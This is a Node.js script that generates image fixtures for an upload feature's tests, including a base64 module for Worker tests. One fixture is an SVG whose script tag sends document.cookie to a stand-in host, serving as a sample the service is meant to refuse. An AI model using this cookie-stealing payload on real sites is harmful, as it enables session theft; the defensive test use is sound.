#!/usr/bin/env node
/**
 * Generates the image fixtures the story 12 tests use (`tests/fixtures/images/`).
 *
 * They have to be real files a browser and a byte-sniffing server both agree about, so
 * they are built here rather than committed as base64 blobs nobody can audit:
 *
 * - PNG is written by hand (zlib + CRC32), which gives exact pixel dimensions.
 * - JPEG, and WebP too, are encoded by headless Chromium from a canvas, so they are
 *   standard files rather than something a hand-rolled encoder hopes is valid.
 * - the animated GIF uses the "uncompressed GIF" LZW form (literals only, with regular
 *   clear codes), which keeps the code size fixed and the file unambiguous.
 * - the SVG, the PDF renamed to `.png` and the truncated PNG are the refusals.
 * The size-boundary files (exactly `IMAGE_MAX_BYTES`, and one byte more) are *not* written
 * here: eleven-megabyte files have no business in a repository. A test builds them from
 * `photo-small.jpg` at run time — see `tests/fixtures/images/padded.ts` — padded after the
 * JPEG end-of-image marker, which every decoder in the browsers we test ignores.
 *
 * The integration tests cannot read any of this: a Worker isolate has no file system at
 * all, so the same generator also writes `tests/fixtures/image-bytes.ts`, which holds the
 * small fixtures inline as base64 built in the same run. Those are the bytes the Worker sees
 * in its own tests; the browser tests use the files.
 *
 * Run it with `node scripts/make-image-fixtures.mjs` after changing a fixture.
 */
import { deflateSync } from 'node:zlib';
import { mkdirSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
const OUT = join(ROOT, 'tests', 'fixtures', 'images');

mkdirSync(OUT, { recursive: true });

/* -------------------------------------------------------------------------- */
/* PNG                                                                        */
/* -------------------------------------------------------------------------- */

const CRC_TABLE = (() => {
  const table = new Int32Array(256);
  for (let n = 0; n < 256; n += 1) {
    let c = n;
    for (let k = 0; k < 8; k += 1) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    table[n] = c;
  }
  return table;
})();

function crc32(buffer) {
  let crc = -1;
  for (const byte of buffer) crc = CRC_TABLE[(crc ^ byte) & 0xff] ^ (crc >>> 8);
  return (crc ^ -1) >>> 0;
}

function chunk(type, data) {
  const length = Buffer.alloc(4);
  length.writeUInt32BE(data.length, 0);
  const body = Buffer.concat([Buffer.from(type, 'ascii'), data]);
  const crc = Buffer.alloc(4);
  crc.writeUInt32BE(crc32(body), 0);
  return Buffer.concat([length, body, crc]);
}

/**
 * An 8-bit RGBA PNG. `pixel(x, y)` returns `[r, g, b, a]`; every row is written with
 * filter type 0 (None), which libpng and Chromium accept and keeps the encoder short.
 */
function encodePng(width, height, pixel) {
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(width, 0);
  ihdr.writeUInt32BE(height, 4);
  ihdr[8] = 8; // bit depth
  ihdr[9] = 6; // truecolour with alpha
  const raw = Buffer.alloc(height * (1 + width * 4));
  for (let y = 0; y < height; y += 1) {
    const rowStart = y * (1 + width * 4);
    raw[rowStart] = 0;
    for (let x = 0; x < width; x += 1) {
      const [r, g, b, a] = pixel(x, y);
      const at = rowStart + 1 + x * 4;
      raw[at] = r;
      raw[at + 1] = g;
      raw[at + 2] = b;
      raw[at + 3] = a;
    }
  }
  return Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    chunk('IHDR', ihdr),
    chunk('IDAT', deflateSync(raw, { level: 9 })),
    chunk('IEND', Buffer.alloc(0)),
  ]);
}

/** A deterministic pseudo-random generator, so the fixtures do not change each run. */
function noise(seed) {
  let state = seed >>> 0 || 1;
  return () => {
    state ^= state << 13;
    state >>>= 0;
    state ^= state >> 17;
    state ^= state << 5;
    state >>>= 0;
    return state / 0xffffffff;
  };
}

/** A workshop screenshot: a title bar, a grid of cards, a coloured border. */
function screenshotPng(width, height, seed) {
  const random = noise(seed);
  const cardCols = 4;
  const cardRows = 3;
  const shades = Array.from({ length: cardCols * cardRows }, () => 180 + Math.floor(random() * 60));
  return encodePng(width, height, (x, y) => {
    if (x < 6 || y < 6 || x >= width - 6 || y >= height - 6) return [38, 50, 56, 255];
    if (y < height * 0.12) return [236, 239, 241, 255];
    const gx = Math.floor(((x - 6) / (width - 12)) * cardCols);
    const gy = Math.floor(((y - height * 0.12) / (height * 0.88)) * cardRows);
    const shade = shades[Math.min(shades.length - 1, Math.max(0, gy * cardCols + gx))] ?? 220;
    return [shade, shade - 20, shade - 40, 255];
  });
}

/* -------------------------------------------------------------------------- */
/* GIF (the "uncompressed" LZW form)                                          */
/* -------------------------------------------------------------------------- */

/**
 * A GIF image stream that only ever emits literal codes.
 *
 * A real LZW encoder would shrink this; what it would also add is a code-size increase,
 * which is the part of GIF encoders people get wrong. Emitting literals keeps the code
 * size fixed at `minCodeSize + 1` for the whole stream, at the cost of a clear code every
 * `RESET_EVERY` pixels (the decoder adds one dictionary entry per literal after a clear,
 * and 200 of them never reaches the 256 entries that would force a wider code).
 */
function gifImageStream(indices, minCodeSize) {
  const clear = 1 << minCodeSize;
  const eoi = clear + 1;
  const RESET_EVERY = 200;
  const bits = [];
  let buffer = 0;
  let buffered = 0;
  const codeSize = minCodeSize + 1;
  const emit = (code) => {
    buffer |= code << buffered;
    buffered += codeSize;
    while (buffered >= 8) {
      bits.push(buffer & 0xff);
      buffer >>>= 8;
      buffered -= 8;
    }
  };
  emit(clear);
  indices.forEach((index, i) => {
    if (i > 0 && i % RESET_EVERY === 0) emit(clear);
    emit(index);
  });
  emit(eoi);
  if (buffered > 0) bits.push(buffer & 0xff);

  const out = [minCodeSize];
  const bytes = Buffer.from(bits);
  for (let at = 0; at < bytes.length; at += 255) {
    const block = bytes.subarray(at, Math.min(bytes.length, at + 255));
    out.push(block.length, ...block);
  }
  out.push(0);
  return Buffer.from(out);
}

/** A two-frame animated GIF, the two halves alternating, with a 100 ms delay. */
function animatedGif(width, height) {
  const palette = [
    [244, 67, 54],
    [33, 150, 243],
    [255, 235, 59],
    [255, 255, 255],
  ];
  // A 256-entry table: literals are a byte each, so the literal-only stream below can
  // run 200 pixels between clear codes without the dictionary ever reaching the 512
  // entries that would force a wider code.
  const minCodeSize = 8;
  const tableSize = 1 << minCodeSize;
  const packed = 0x80 | (7 << 4) | 7;
  const short = (value) => [value & 0xff, (value >> 8) & 0xff];

  const header = [...Buffer.from('GIF89a', 'ascii')];
  const screen = [width & 0xff, width >> 8, height & 0xff, height >> 8, packed, 0, 0];
  const table = [];
  for (let i = 0; i < tableSize; i += 1) {
    const [r, g, b] = palette[i] ?? [0, 0, 0];
    table.push(r, g, b);
  }
  const netscape = [
    0x21, 0xff, 0x0b,
    ...Buffer.from('NETSCAPE2.0', 'ascii'),
    0x03, 0x01, 0x00, 0x00, 0x00,
  ];

  const frames = [];
  for (let frame = 0; frame < 2; frame += 1) {
    const indices = [];
    for (let y = 0; y < height; y += 1) {
      for (let x = 0; x < width; x += 1) {
        const on = (x + y) % 8 < 4;
        indices.push(on ? (frame === 0 ? 0 : 1) : 3);
      }
    }
    frames.push(
      Buffer.from([0x21, 0xf9, 0x04, 0x04, ...short(10), 0x00, 0x00]),
      Buffer.from([0x2c, 0x00, 0x00, 0x00, 0x00, width & 0xff, width >> 8, height & 0xff, height >> 8, 0x00]),
      gifImageStream(indices, minCodeSize),
    );
  }

  return Buffer.concat([
    Buffer.from(header),
    Buffer.from(screen),
    Buffer.from(table),
    Buffer.from(netscape),
    ...frames,
    Buffer.from([0x3b]),
  ]);
}

/* -------------------------------------------------------------------------- */
/* Chromium-encoded formats                                                   */
/* -------------------------------------------------------------------------- */

/** Encode a noisy canvas in a browser format Chromium knows (`image/jpeg`, `image/webp`). */
async function encodeWithChromium(type, width, height, quality) {
  const { chromium } = await import('playwright');
  const browser = await chromium.launch();
  try {
    const page = await browser.newPage();
    const dataUrl = await page.evaluate(
      async ({ type, width, height, quality }) => {
        const canvas = new OffscreenCanvas(width, height);
        const context = canvas.getContext('2d');
        const image = context.createImageData(width, height);
        // Structured colour plus fine grain: a flat canvas compresses to almost nothing,
        // and a fixture is meant to have a realistic weight.
        let state = 12345;
        const random = () => {
          state ^= state << 13;
          state >>>= 0;
          state ^= state >> 17;
          state ^= state << 5;
          state >>>= 0;
          return state / 0xffffffff;
        };
        for (let y = 0; y < height; y += 1) {
          for (let x = 0; x < width; x += 1) {
            const at = (y * width + x) * 4;
            const band = Math.floor((y / height) * 8) * 24;
            image.data[at] = (x / 4 + band + random() * 40) % 256;
            image.data[at + 1] = (y / 3 + random() * 40) % 256;
            image.data[at + 2] = ((x + y) / 6 + random() * 40) % 256;
            image.data[at + 3] = 255;
          }
        }
        context.putImageData(image, 0, 0);
        const blob = await canvas.convertToBlob({ type, quality });
        const bytes = new Uint8Array(await blob.arrayBuffer());
        let binary = '';
        for (let i = 0; i < bytes.length; i += 8192) {
          binary += String.fromCharCode.apply(null, bytes.subarray(i, i + 8192));
        }
        return btoa(binary);
      },
      { type, width, height, quality },
    );
    return Buffer.from(dataUrl, 'base64');
  } finally {
    await browser.close();
  }
}

/**
 * An SVG that carries a script tag. Not an accepted type, and the reason it is not: markup
 * stored on a board comes back to a browser as markup (`image.types`).
 */
const SVG_TEXT = [
  '<?xml version="1.0" encoding="UTF-8"?>',
  '<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64">',
  '  <script>document.location="https://vidi6.example.test/stolen?c="+document.cookie</script>',
  '  <rect width="64" height="64" fill="#e91e63"/>',
  '</svg>',
  '',
].join('\n');

/** A minimal PDF, used as the file that is a document rather than a picture. */
const PDF_TEXT = [
  '%PDF-1.4',
  '%âãÏÓ',
  '1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj',
  'trailer << /Root 1 0 R /Size 2 >>',
  '%%EOF',
  '',
].join('\n');

/* -------------------------------------------------------------------------- */

async function main() {
  const written = [];
  const save = (name, data) => {
    writeFileSync(join(OUT, name), data);
    written.push(`${name}  ${data.length} bytes`);
  };

  save('screenshot.png', screenshotPng(1440, 900, 7));
  save('screenshot-alt.png', screenshotPng(1440, 900, 21));
  save('screenshot-third.png', screenshotPng(1440, 900, 33));
  save('small.png', encodePng(300, 200, (x, y) => [(x * 3) % 256, (y * 5) % 256, 128, 255]));
  save('portrait.png', encodePng(300, 3200, (x, y) => [(x / 3) % 256, (y / 16) % 256, 90, 255]));
  save('animation.gif', animatedGif(48, 32));

  const jpeg = await encodeWithChromium('image/jpeg', 1600, 1200, 0.6);
  save('photo.jpg', jpeg);
  const smallJpeg = await encodeWithChromium('image/jpeg', 640, 480, 0.7);
  save('photo-small.jpg', smallJpeg);

  const webp = await encodeWithChromium('image/webp', 480, 360, 0.85);
  save('picture.webp', webp);

  save('script.svg', Buffer.from(SVG_TEXT, 'utf8'));
  save('renamed-pdf.png', Buffer.from(PDF_TEXT, 'utf8'));

  const full = screenshotPng(1440, 900, 9);
  const truncated = full.subarray(0, Math.floor(full.length * 0.4));
  save('corrupt.png', truncated);

  const png = screenshotPng(32, 20, 7);
  const jpegMini = await encodeWithChromium('image/jpeg', 64, 48, 0.8);
  const webpMini = await encodeWithChromium('image/webp', 64, 48, 0.9);
  const gif = animatedGif(48, 32);

  /* ---------------------------------------------------------------------- */
  /* The inline module the Worker's own tests read                          */
  /* ---------------------------------------------------------------------- */

  const inline = [
    '/**',
    ' * The story 12 fixtures a Worker test can use, as bytes rather than as files.',
    ' *',
    ' * GENERATED by `scripts/make-image-fixtures.mjs` — do not edit. The files in',
    ' * `tests/fixtures/images/` are what a browser test drops or uploads; a Worker isolate',
    ' * has no file system, so the same generator writes these out of the same run, which is',
    ' * what makes them the same pictures rather than an approximation of them.',
    ' *',
    ' * Each is small on purpose: a ten-megabyte constant would be committed twice over, and',
    ' * the size limit is tested by padding one of these (`paddedTo`), not by holding one.',
    ' */',
    '',
    '/** Decode a base64 string written in this file. `atob` is in workerd, node and browsers. */',
    'export function bytesFromBase64(base64: string): Uint8Array {',
    '  const binary = atob(base64);',
    '  const bytes = new Uint8Array(binary.length);',
    '  for (let index = 0; index < binary.length; index += 1) bytes[index] = binary.charCodeAt(index);',
    '  return bytes;',
    '}',
    '',
    'const PNG_32X20 =',
    `  '${png.toString('base64')}';`,
    '',
    'const JPEG_64X48 =',
    `  '${jpegMini.toString('base64')}';`,
    '',
    'const WEBP_64X48 =',
    `  '${webpMini.toString('base64')}';`,
    '',
    'const GIF_ANIMATED_48X32 =',
    `  '${gif.toString('base64')}';`,
    '',
    'const PDF_HEADER =',
    `  '${Buffer.from(PDF_TEXT, 'utf8').toString('base64')}';`,
    '',
    'const SVG_WITH_SCRIPT =',
    `  '${Buffer.from(SVG_TEXT, 'utf8').toString('base64')}';`,
    '',
    '/** A real 32×20 PNG, which is all a `201` needs. */',
    'export function pngBytes(): Uint8Array {',
    '  return bytesFromBase64(PNG_32X20);',
    '}',
    '',
    '/** A real JPEG, for padding to either side of the size limit. */',
    'export function jpegBytes(): Uint8Array {',
    '  return bytesFromBase64(JPEG_64X48);',
    '}',
    '',
    '/** A real WebP: the only format whose signature is not at the very start. */',
    'export function webpBytes(): Uint8Array {',
    '  return bytesFromBase64(WEBP_64X48);',
    '}',
    '',
    '/** A real two-frame animated GIF. */',
    'export function gifBytes(): Uint8Array {',
    '  return bytesFromBase64(GIF_ANIMATED_48X32);',
    '}',
    '',
    '/** A PDF: refused by the Worker however it is named, because it is not a picture. */',
    'export function pdfBytes(): Uint8Array {',
    '  return bytesFromBase64(PDF_HEADER);',
    '}',
    '',
    '/** An SVG carrying script — markup the board must never store or serve. */',
    'export function svgBytes(): Uint8Array {',
    '  return bytesFromBase64(SVG_WITH_SCRIPT);',
    '}',
    '',
    '/**',
    ' * `bytes` padded with spaces to exactly `length`.',
    ' *',
    ' * A JPEG decoder stops at the end-of-image marker and never looks at what follows, so',
    ' * this is a decodable JPEG whose only remarkable property is how long it is — which is',
    ' * exactly what `image.size_limit` is written against.',
    ' */',
    'export function paddedTo(bytes: Uint8Array, length: number): Uint8Array {',
    '  if (length < bytes.length) {',
    '    throw new Error(`cannot pad ${bytes.length} bytes to ${length}`);',
    '  }',
    '  const padded = new Uint8Array(length);',
    '  padded.set(bytes, 0);',
    '  padded.fill(0x20, bytes.length);',
    '  return padded;',
    '}',
    '',
  ].join('\n');

  writeFileSync(join(ROOT, 'tests', 'fixtures', 'image-bytes.ts'), `${inline}\n`);
  console.log(`${written.join('\n')}\nimage-bytes.ts  (inlined for workerd)`);
}

await main();
